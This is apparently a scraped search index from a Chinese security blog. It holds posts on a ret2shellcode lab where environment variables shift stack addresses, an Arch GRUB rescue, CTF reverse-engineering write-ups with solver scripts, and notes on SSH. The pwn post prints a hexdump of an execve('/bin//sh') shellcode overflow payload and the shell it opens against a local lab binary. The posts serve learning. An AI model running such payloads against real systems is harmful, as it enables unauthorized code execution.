","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:4:0","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"无法复现的ret2shellcode 今天在尝试复现一步一步学ROP之linux_x86篇 蒸米时第一个ret2shellcode时遇到了问题 题目本身比较简单，由于关闭了NX保护，栈有了执行权限。也关闭了ASLR保护，关闭了地址随机化。故直接在输入时塞一段shellcode，然后覆盖返回地址，使eip跳转到shellcode开头进行执行，即可getshell。但最大的问题在于如何获取shellcode的起始地址（即栈上的一个地址）。 如果我们直接用gdb去调试可执行程序，得到栈上的地址，覆盖返回地址进行栈溢出攻击，会发现无法成功。原文中作者这样解释道： 原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。 为了解决这个问题，作者建议我们开启core dump之后再执行./level1，同时输入足够溢出长度的字符串使程序崩溃，然后用gdb载入生成的core dump文件，从而获取到执行过程中的栈上地址。 然而，经过尝试，使用core dump的地址覆盖返回地址进行攻击同样会失败。经过更多的尝试，多次进行core dump得到的地址并不一样，多次进行gdb直接调试得到的栈上地址也不相同，在不同的终端中进行得到的地址也可能不同。 唯一可行的办法是在exp中把gdb attach上去进行调试，得到的地址可以成功完成攻击，得到shell。但是，在不同终端中同样的脚本仍可能会失败。 似乎栈地址仍是随机化的，还有什么因素在影响栈地址吗？ ","date":"2023-01-09","objectID":"/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/:1:0","tags":["CTF","pwn"],"title":"ASLR保护关闭情况下环境变量对栈地址的影响","uri":"/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/"},{"categories":["Binary"],"content":"环境变量悄悄作祟 最终找到了stack overflow上的一篇回答，第一个回答中作者的配图如下： 原来，操作系统在加载程序时会将环境变量和程序参数放在栈地址之前。于是，在不同环境变量的环境中栈的起始地址是不一样的（已关闭ASLR情况下），栈上内容的地址自然也不一样。 对此，我们可以做个简单的实验验证一下： 注：以下使用的是fish shell，set -x和set -e分别是fish中设置/取消环境变量的语法   ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86  pwn 16:51:00 ❯ python exp1.py # 第一次执行攻击脚本 [+] Starting local process './level1' argv=[b'./level1'] : pid 116511 [DEBUG] Sent 0x90 bytes: 00000000 31 c9 f7 e1 51 68 2f 2f 73 68 68 2f 62 69 6e 89 │1···│Qh//│shh/│bin·│ 00000010 e3 b0 0b cd 80 61 61 61 61 61 61 61 61 61 61 61 │····│·aaa│aaaa│aaaa│ 00000020 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000080 61 61 61 61 61 61 61 61 61 61 61 61 b0 d4 ff ff │aaaa│aaaa│aaaa│····│ 00000090 [*] Switching to interactive mode $ ls [DEBUG] Sent 0x3 bytes: # 能够正常get shell并执行命令 b'ls\\n' [DEBUG] Received 0x45 bytes: b'exp1.py level1 level1.c level2 pattern.py socat-2.0.0-b8.tar.gz\\n' exp1.py level1 level1.c level2 pattern.py socat-2.0.0-b8.tar.gz $ [*] Stopped process './level1' (pid 116511)   ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86  5s  pwn 16:51:13 ❯ set -x var 123 # 添加一个环境变量 var = 123   ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86  pwn 16:51:27 ❯ python exp1.py # 第二次执行攻击脚本（添加环境变量后） [+] Starting local process './level1' argv=[b'./level1'] : pid 116661 [DEBUG] Sent 0x90 bytes: 00000000 31 c9 f7 e1 51 68 2f 2f 73 68 68 2f 62 69 6e 89 │1···│Qh//│shh/│bin·│ 00000010 e3 b0 0b cd 80 61 61 61 61 61 61 61 61 61 61 61 │····│·aaa│aaaa│aaaa│ 00000020 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000080 61 61 61 61 61 61 61 61 61 61 61 61 b0 d4 ff ff │aaaa│aaaa│aaaa│····│ 00000090 [*] Switching to interactive mode [*] Got EOF while reading in interactive # get shell失败 $ [*] Process './level1' stopped with exit code -11 (SIGSEGV) (pid 116661)   ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86  3s  pwn 16:51:35 ❯ set -e var # 删除设置的环境变量var   ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86  pwn 16:51:50 ❯ python exp1.py # 第三次执行攻击脚本 [+] Starting local process './level1' argv=[b'./level1'] : pid 116805 [DEBUG] Sent 0x90 bytes: 00000000 31 c9 f7 e1 51 68 2f 2f 73 68 68 2f 62 69 6e 89 │1···│Qh//│shh/│bin·│ 00000010 e3 b0 0b cd 80 61 61 61 61 61 61 61 61 61 61 61 │····│·aaa│aaaa│aaaa│ 00000020 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000080 61 61 61 61 61 61 61 61 61 61 61 61 b0 d4 ff ff │aaaa│aaaa│aaaa│····│ 00000090 [*] Switching to interactive mode $ ls [DEBUG] Sent 0x3 bytes: # 可正常get shell并执行命令 b'ls\\n' [DEBUG] Received 0x45 bytes: b'exp1.py level1 level1.c level2 pattern.py socat-2.0.0-b8.tar.gz\\n' exp1.py level1 level1.c level2 pattern.py socat-2.0.0-b8.tar.gz 可以发现，原本可以攻击成功的脚本在添加一个无关紧要的环境变量之后无法完成攻击。而在删除这个变量之后，脚本又能成功get shell。可见环境变量确实对栈地址有影响。 ","date":"2023-01-09","objectID":"/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/:2:0","tags":["CTF","pwn"],"title":"ASLR保护关闭情况下环境变量对栈地址的影响","uri":"/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/"},{"categories":["Binary"],"content":"题外话 搞清楚以上问题之后，笔者忽然想起了前段时间做过的MIT 6.858的一个lab，其中给出了一个clean-env.sh。当时还没有重视，现在想起来，和这里的原理也是一样的。还是得赞叹一下这个lab设计的严谨。 相比之下，笔者还没有找到给出正确解释中文资料，反倒是有不少将错就错、不求甚解的存在。 ","date":"2023-01-09","objectID":"/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/:3:0","tags":["CTF","pwn"],"title":"ASLR保护关闭情况下环境变量对栈地址的影响","uri":"/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/"},{"categories":["Life"],"content":"起因是昨天晚上RX👴突然跟我说：你的gitalk是不是有点问题，怎么要我所有public repo的write权限。 前段时间装gitalk的时候还没注意，于是这次专门去搜了半天，最终发现没办法修改权限。具体原因是github oauth apps权限是默认全开的，且无法修改，而gitalk似乎只能基于oauth app。（试了试github apps没成功，不排除是我的问题）并且去翻了翻一些使用gitalk的其他博客，发现清一色是要所有权限，估计多少有点历史原因了。 至此，决定给gitalk扬了。RX👴给我推荐了giscus，👴一看这个果然好，基于github apps，权限限制一清二楚，开整！ 但是，凡事总有但是。👴的主题并不支持giscus，想用就只能自己去改html。模板文件不多，很容易找到，代码也很好写，但是放上去一看发现没这么简单，布局炸了，评论框占了半个屏幕。 如果👴是个前端带师，估计三两下给它收拾了，但👴不会前端。看了半天文档，学到了点go template语法，但还是不会改。👴想起来从开始用这个主题，就一直在修修补补，包括但不限于换了过时的js库、扬了废弃的特性、改了不能用的配置等等，毕竟作者的github仓库已经archive几年了。心一横说👴自己写一个主题算了，于是又去看了半天hugo文档。 但是，凡事总不止一个但是。👴在google查一个东西的时候突然跳出来了LoveIt，突然一下子顿悟了，阻挡我最大的困难并不是什么go template，前端语法之类的，而是设计的灵感。 真心崇拜每一个有灵感、会设计的人。 以上，LoveIt！ ","date":"2023-01-05","objectID":"/2023/01/hello-loveit/:0:0","tags":["hugo-theme"],"title":"Hello, LoveIt","uri":"/2023/01/hello-loveit/"},{"categories":["Linux"],"content":"我只想扬了系统更新报错 刚开始其实并没想折腾内核，只是想解决系统更新一些看不懂的报错 archlinux在每次进行系统更新时，如果涉及内核相关，就会触发pacman钩子，调用mkinitcpio脚本重新构建内核镜像，这部分详见 https://wiki.archlinuxcn.org/wiki/Mkinitcpio （这也是我在排错时才知道的），但我的机器每次都会输出几行Error，看得人十分不爽： ==\u003e ERROR: module not found: `nvidia' ==\u003e ERROR: module not found: `nvidia_modeset' ==\u003e ERROR: module not found: `nvidia_uvm' ==\u003e ERROR: module not found: `nvidia_drm' 有过之前两次搞崩显卡无法开机的经历，以及一切都还能用，之前一直没管过它，但这次想刨根问底了，经过一段时间google，在archwiki上找到了这一篇文章，问题几乎和我一模一样。 最后发现我之前不知道什么时候安装过linux-zen这个包，同时我一直在使用的是linux这个包的主线内核，在上述调用mkinitcpio脚本的过程中，会同时尝试构建linux和linux-zen两种内核的镜像，linux镜像一直能够正常构建，出问题的只是linux-zen镜像的构建。 到这反而激起了我的兴趣，去了解了一下各种内核，贴一个archwiki的介绍，发现linux-zen内核可能会有更好的性能表现，且对wine的某些体验会有较大的提升。于是我抱着好奇的心态准备换个内核 ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:1:0","tags":["linux","grub"],"title":"Archlinux Grub引导抢救实录","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["Linux"],"content":"grub直接进bios反复鬼畜 先装好了linux-zen和linux-zen-headers两个包，然后为了解决上面找不到nvidia模块的问题需要把nvidia换成nvidia-dkms，装完之后就没有ERROR了 然后尝试reboot进入zen内核，发现grub菜单并没有zen内核的选项，查了查发现需要重新生成grub配置，即sudo grub-mkconfig -o /boot/grub/grub.cfg。从这，噩梦开始 reboot之Welcome to grub一闪而过，然后电脑关机，再开机直接进入了bios。bios里选择继续启动，就会重复上面的动作，一闪而过、关机、开机、进bios，反复鬼畜 wiki上发现了和我相同的遭遇，但是并没有解决，不了了之了。到处搜索发现基本都是教你grub引导出错进入grub shell该怎么办，但我能用的只有bios，连能执行命令的地方都没有。另外的办法还可以使用装系统的启动盘引导启动，但我手边根本没有，只有一个装在移动硬盘里的windows，它能救我吗？ ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:2:0","tags":["linux","grub"],"title":"Archlinux Grub引导抢救实录","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["Linux"],"content":"windows删grub配置进grub-shell 在bios选择移动硬盘启动成功了开起来了windows。第一想法是grub.cfg有问题，想要修改grub.cfg，但其实这个文件只能用sudo grub-mkconfig -o /boot/grub/grub.cfg生成，但在windows上显然无法执行命令。 这时突然想到前面看过很多误删grub.cfg的解决方案，直接死马当活马医，使用linuxReader挂载了linux的硬盘，给grub.cfg扬了。重新reboot成功进入了grub shell，但这时我也发现了另一个问题：我进不了bios了。这意味着如果我无法在grub shell解决问题，恐怕就只能重装系统了 ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:3:0","tags":["linux","grub"],"title":"Archlinux Grub引导抢救实录","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["Linux"],"content":"手动引导进入系统以及重装grub 又是查了半天，学会了如何手动引导，archwiki上有简略的命令可以参考，但如果想我一样对linux``initrd等命令不熟悉还需要多查查才能搞明白。其中需要避坑的是有些文章时间久远，写的是grub1的命令，而现在大家用的基本都是grub2，grub1的命令诸如root``kernel等在grub2中被启用或替代 这里放一篇比较详细的介绍，看完基本就能理解如何使用这几条命令了，在这就不赘述。至此，我的arch终于活过来了，成功进入系统。 至于如何修复grub，由于我没有耐心去看grub的文档了，索性重装。重新安装了grub包，然后重新执行了sudo grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=archlinux，然后生成配置文件sudo grub-mkconfig -o /boot/grub/grub.cfg。reboot之后成功进入了grub菜单，并能够选择linux和linux-zen内核。 到底grub为什么会出错不想再深究了，总有很多玄学问题没有答案。 ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:4:0","tags":["linux","grub"],"title":"Archlinux Grub引导抢救实录","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["Linux"],"content":"题外话 深刻地感受到了arch社区的强大、wiki的细致 能够自己动手一步步探索、解决问题，算是终于成了一个合格的arch用户 ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:5:0","tags":["linux","grub"],"title":"Archlinux Grub引导抢救实录","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["WriteUps"],"content":"挺有意思的一道题，本身不算难，但最后加上我只有4解还是挺惊讶 题目是个命令行小游戏，运行起来可以看到屏幕的第一行会一直打印一些字符，但仔细看都是乱码 伪代码内容比较清晰，大段都是关于命令行参数、不同终端的处理之类的东西，重点内容如下： while ( v13 ) { if ( dword_E104 ) printf(\"\\x1B[H\"); else printf(\"\\x1B[u\"); for ( screen_row = top; screen_row \u003c bottom; ++screen_row ) { for ( screen_col = left; screen_col \u003c right; ++screen_col ) { if ( screen_row \u003c= 23 || screen_row \u003e 42 || screen_col \u003e= 0 ) { if ( screen_col \u003e= 0 \u0026\u0026 (unsigned int)screen_row \u003c= 0x3F \u0026\u0026 screen_col \u003c= 63 ) { v19 = screen[screen_cnt][screen_row][screen_col]; off_FA88 = sub_6314((unsigned int)screen_cnt, screen_row, screen_col, (__int64)v12); } else { v19 = 44; } } else { v18 = (2 - screen_col) % 16 / 8; if ( ((screen_cnt \u003e\u003e 1) \u0026 1) != 0 ) v18 = 1 - v18; s[128] = (__int64)\",,\u003e\u003e\u0026\u0026\u0026+++###==;;;,,\"; v19 = asc_BFE3[v18 - 23 + screen_row]; if ( !v19 ) v19 = 44; } if ( v25 ) { printf(\"%s\", *((const char **)\u0026unk_FCC0 + v19)); } else if ( v19 == v22 || !*((_QWORD *)\u0026unk_FCC0 + v19) ) { printf(\"%s\", off_FA88); } else { v22 = v19; printf(\"%s%s\", *((const char **)\u0026unk_FCC0 + v19), off_FA88); } } sub_65E2(1LL); } if ( dword_E100 ) { time(\u0026time1); v11 = difftime(time1, timer); v10 = sub_63FF((unsigned int)(int)v11); for ( n = (dword_E1FC - 29 - v10) / 2; n \u003e 0; --n ) putchar(' '); key += printf(\"\\x1B[1;37mYou have nyaned for %d times!\\x1B[J\\x1B[0m\", (unsigned int)++dword_108E0); } v22 = 0; ++frame_count; if ( frames \u0026\u0026 frame_count == frames ) quit(); if ( !screen[++screen_cnt] ) screen_cnt = 0LL; usleep(1000 * v27); } char *__fastcall sub_6314(__int64 a1, int a2, int a3, __int64 a4) { if ( a2 != 18 ) return (char *)a4; if ( a3 \u003c= 4 || a3 \u003e 54 ) return (char *)a4; byte1 = 32; enc[a3 - 5] ^= cal_key(); if ( is_printable_char(enc[a3 - 5]) ) byte2 = enc[a3 - 5] \u0026 0x7F; else byte2 = 32; return \u0026byte2; } __int64 cal_key() { key = 1103515245 * key + 12345; return (key \u003e\u003e 10) \u0026 0x7FFF; } 可以看出这就是更新屏幕显示内容的逻辑，我们关心的是第一行那一串字符，产生这些字符的逻辑在sub_6314，结合这个函数内的if限制可以得到，只有$screen_row = 18 且 screen_col \\in [5, 54]$时才会真正产生字符，即画面中字符的位置 而字符的具体值是由enc数组和key的值计算而来的，结合hint说要抄写这个算法跑一分钟就能出flag，最终exp： #include \u003cstdio.h\u003e #include \u003cstring.h\u003e unsigned int key = 0x1106; unsigned int cal_key() { key = (0x41C64E6D * key + 12345) \u0026 0xffffffff; return (((int)key \u003e\u003e 10) \u0026 0x7fff); } int cal_digit(int num) { int digit = 0; while(num) { num /= 10; digit++; } return digit; } int main() { int cnt = 0; unsigned char flag[50]; unsigned int enc[] = { 0x27FB, 0x27A4, 0x464E, 0x0E36, 0x7B70, 0x5E7A, 0x1A4A, 0x45C1, 0x2BDF, 0x23BD, 0x3A15, 0x5B83, 0x1E15, 0x5367, 0x50B8, 0x20CA, 0x41F5, 0x57D1, 0x7750, 0x2ADF, 0x11F8, 0x09BB, 0x5724, 0x7374, 0x3CE6, 0x646E, 0x010C, 0x6E10, 0x64F4, 0x3263, 0x3137, 0x00B8, 0x229C, 0x7BCD, 0x73BD, 0x480C, 0x14DB, 0x68B9, 0x5C8A, 0x1B61, 0x6C59, 0x5707, 0x09E6, 0x1FB9, 0x2AD3, 0x76D4, 0x3113, 0x7C7E, 0x11E0, 0x6C70}; while(1) { for (int i = 0; i \u003c 50; i++) { enc[i] ^= cal_key(key); if (((enc[i] \u0026 127) \u003e 32) \u0026\u0026 ((enc[i] \u0026 127) \u003c= 126)) { flag[i] = enc[i] \u0026 127; } else { flag[i] = ' '; } } if (!strncmp(flag, \"CatCTF\", 6)) { puts(flag); return 0; } cnt++; key += 41; // key要加上printf的返回值 key += cal_digit(cnt); } } 为了节省运算时间，代码中做了一些省略，和计算字符串无关的代码，比如screen_row和screen_col的两个外层循环直接扬了 需要注意每次for循环结束之后，key的值要加上printf函数的返回值，即输出的字符数 踩到的另外一个坑：刚开始想法将所有字符输出到一个文件里，然后结合grep去找有用的字符串，理论可行，但一分钟跑出来就全是乱码，还以为是算法写得有问题。最后又尝试了一遍，程序一分半也没跑出结果，输出文件已经达到了4.7G，使用grep提示内存耗尽，文本编辑器尝试打开直接崩溃，还是挺吓人的，同时也可以看出如printf等输出函数对程序运行效率的降低非常大。 最终flag：CatCTF{Fly1NG_NyAnC4t_Cha5eS_the_FL4G_in_The_Sky} ","date":"2023-01-01","objectID":"/2023/01/catctf-catfly-wp/:0:0","tags":["CTF","reverse"],"title":"NepnepxCatCTF Reverse CatFly WriteUp","uri":"/2023/01/catctf-catfly-wp/"},{"categories":["WriteUps"],"content":"这场比赛唯一有意义的一道逆向题，需要熟悉idapython的api，并要求一定数据结构知识，在这贴几个脚本方便以后可能用到 整个题目就是在探索路径，动调得知main_convert会把输入转换成二进制01数组，然后根据01走相应的分支，一个点往后对应两条路，相当于要建一个二叉树 给节点改个名先 start = 0x401000 end = 0x583400 index = 0 for i in range(start, end): if \"godeep_tree.\" in get_name(i): set_name(i, \"node\"+str(index)) index += 1 总共5672个节点，获取所有节点和边 from idaapi import * from idc import * start = 0x401000 end = 0x583400 out = open(\"out.txt\", \"w\") for i in range(start, end): parent = get_name(i) if parent[0:4] != \"node\": continue out.write(parent[4:]+\" \") j = i f = False child = GetDisasm(j) last = \"\" while child != \"retn\": if last == child: j += 1 child = GetDisasm(j) continue if child == 'call node5672': if f: out.write(child[child.find('e')+1:] +\" \") else: f = True elif 'call node' in child: out.write(child[child.find('e')+1:]+\" \") elif 'wrong' in child: out.write(\"wrong \") elif 'right' in child: out.write(\"right \") last = child j += 1 child = GetDisasm(j) out.write('\\n') 建立二叉树+dfs求路径 from Crypto.Util.number import * file = open(\"out.txt\", \"r\") dic = dict() class TreeNode: def __init__(self, id): self.id = id self.state = True self.flag = False self.left = None self.right = None root = TreeNode(9999) node0 = TreeNode(0) root.left = node0 dic[0] = node0 for i in file.readlines(): parent = eval(i.split()[0]) parent_node = TreeNode(parent) if dic.get(parent) != None: parent_node = dic.get(parent) else: dic[parent] = parent_node if i.split()[1] == 'wrong': parent_node.state = False continue if i.split()[1] == 'right': parent_node.flag = True continue if len(i.split()) == 2: left_node = TreeNode(eval(i.split()[1])) dic[eval(i.split()[1])] = left_node parent_node.left = left_node elif len(i.split()) == 3: left_node = TreeNode(eval(i.split()[1])) dic[eval(i.split()[1])] = left_node parent_node.left = left_node right_node = TreeNode(eval(i.split()[2])) dic[eval(i.split()[2])] = right_node parent_node.right = right_node path = [] def dfs(parent): if parent.flag: print(path) print(long_to_bytes(eval(\"0b\"+\"\".join(str(i) for i in path).removeprefix('1')))) exit() if not parent.state: return if parent.left: path.append(1) dfs(parent.left) path.pop(-1) if parent.right: path.append(0) dfs(parent.right) path.pop(-1) dfs(root) print(\"no answer\") print(path) flag{fc03bd97-ff7b-419f-8987-78bc745d3b0a} ","date":"2022-12-26","objectID":"/2022/12/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bgodeep-wp/:0:0","tags":["ctf","reverse"],"title":"春秋杯冬季赛godeep wp","uri":"/2022/12/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bgodeep-wp/"},{"categories":["Dev"],"content":"可执行文件相关 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:0","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#什么是可执行文件 exe（PE）文件、ELF文件 二进制文件 可直接运行 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:1","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#可执行文件的来龙去脉 C源代码 —预处理、编译–\u003e 汇编代码 —汇编编译—\u003e 可重定向目标文件（机器码） —链接—\u003e 可执行文件 编译工具链 gcc（cpp、cc、as、ld）：编译源文件 make/cmake：批量编写编译指令 静态链接/动态链接，静态库(.a.lib)/动态库(.so.dll) 静态链接：把库代码全部写入可执行文件 动态链接：只将一些标记写入可执行文件 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:2","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#可执行文件如何被执行 操作系统为其创建一个新进程（process） 加载器（loader）将可执行文件复制到新进程的内存空间中 CPU执行机器码 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:3","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#可执行文件为何无法执行 CPU架构不同 x86、Arm、Risc-V 无法识别异架构机器码 操作系统不同 win、linux、mac 无法装载可执行文件、库不同、系统调用不同 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:4","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#硬要执行怎么办 虚拟环境(虚拟机、wsl2)：开销大、但准确率高 辅助装载、指令翻译(wine、wsl1)：开销小、但错误多 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:5","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#题外话–从可执行文件看跨平台解决方案 计算机领域问题经典解：加一层 vm(virtual machine)语言 python、java、js与浏览器环境 vm负责在不同的平台给CPU翻译成适合的指令 Qt(一个C++库) 编写代码时使用Qt统一封装的库代替某种系统的特定库 在进行普通的C代码编译之前，Qt先将Qt的库替换成特定系统需要的特定库 一套代码、多次编译 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:6","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"ssh相关 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:0","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#基本概念 ssh：是一套网络协议，用于安全的网络服务和加密远程登录 openssh：是实现ssh协议的主流开源软件 linux机器上的ssh命令：用于连接远程服务器的命令行程序 sshd：是ssh服务端的后台守护程序 基本命令：ssh user@ip -p port ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:1","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#如何保障登录时的安全性 不能明文传输口令/数据 保证密钥交换的安全性 客户端与服务器的互相身份确认 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:2","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#关于非对称加密算法 密钥有公钥和私钥之分 明文用公钥加密得到密文 密文用私钥解密得到明文 公钥和私钥是一一配对的，只有用公钥唯一对应的私钥才能解开密文 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:3","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#基于口令的登录验证 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:4","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#基于公钥的免密登录 客户端（本地）生成公私钥：ssh-keygen -t ed25519 关于加密方式的对比 将公钥发送给服务器：ssh-copy-id user@ip 修改服务器sshd配置，允许公钥登录： \u003e sudo vim /etc/ssh/sshd_config \u003e 找到 PubkeyAuthentication选项，配置为yes，并删除行注释 # 修改完成后重启sshd服务 \u003e sudo systemctl restart sshd ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:5","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#对服务器验证防止中间人攻击 是客户端对服务器身份的验证，防止中间人拦截流量，假冒服务器 第一次使用ssh登录服务器时，需要你手动验证服务器指纹信息： \u003e ssh dx3906@ip The authenticity of host 'ip (ip)' can't 